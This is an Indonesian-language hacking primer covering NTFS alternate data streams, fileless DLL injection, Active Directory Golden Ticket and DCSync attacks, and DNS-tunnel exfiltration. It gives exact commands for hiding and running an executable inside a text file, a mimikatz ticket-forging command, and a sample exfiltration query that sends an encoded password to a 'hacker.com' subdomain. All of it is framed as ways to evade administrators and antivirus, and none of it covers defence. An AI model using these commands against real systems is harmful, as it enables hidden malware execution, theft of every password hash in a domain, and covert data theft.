04 // Ghost Protocols

NTFS ALTERNATE DATA STREAMS (Hidden in Plain Sight)

Fitur Windows yang jarang diketahui. Satu file bisa punya banyak "laci" tersembunyi.

Cara Menyembunyikan File .EXE di dalam .TXT

type malware.exe > laporan.txt:rahasia.exe

Jika Anda cek laporan.txt, ukurannya normal. Isinya teks biasa. Tapi ada stream tersembunyi bernama rahasia.exe yang menempel.

Cara Execute: wmic process call create C:\laporan.txt:rahasia.exe

Admin biasa tidak akan pernah menemukannya lewat Windows Explorer.

FILELESS MALWARE (Reflective DLL Injection)

Malware jadul naruh file di Harddisk -> Terdeteksi Antivirus. Malware dewa hidup di RAM.

Teknik: Load DLL langsung dari memori tanpa pernah menyentuh disk (Write to Disk = Detected). Menggunakan PowerShell untuk memanggil API Windows VirtualAlloc dan CreateThread secara manual.

05 // Active Directory Kill Chain

GOLDEN TICKET ATTACK (God Mode)

Jika Anda berhasil mencuri hash akun krbtgt (Kerberos Ticket Granting Ticket), game over.

Anda bisa membuat "Golden Ticket" palsu. Tiket ini:

  • Berlaku 10 tahun (atau selamanya).
  • Bisa menyamar jadi user SIAPA SAJA (termasuk Enterprise Admin).
  • Tetap valid walau password user asli diganti.
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-xx /krbtgt:HASH /id:500
DCSync (Pura-pura jadi Domain Controller)

Memanfaatkan protokol replikasi Windows. Hacker meminta DC asli untuk "Replikasi Data" (sinkronisasi password hash) ke komputer hacker.

Tidak perlu login ke server, tidak perlu tanam malware. Cukup punya hak akses replikasi, dan tarik semua password hash satu perusahaan.

06 // Data Exfiltration

DNS TUNNELING (Bypass Firewall)

Firewall memblokir port 80 (HTTP), 21 (FTP), 22 (SSH). Tapi jarang memblokir port 53 (DNS) karena internet butuh DNS.

Logika Serangan

Anda ingin mengirim data rahasia "PASSWORD123".

1. Encode jadi Base64 -> "UEFTU1dPUkQxMjM".
2. Lakukan DNS Query ke domain milik hacker: ping UEFTU1dPUkQxMjM.hacker.com
3. Server hacker menerima query tersebut, dan mencatat sub-domainnya. Data berhasil dicuri lewat protokol DNS.

Sangat lambat, tapi hampir mustahil dihentikan tanpa Deep Packet Inspection.
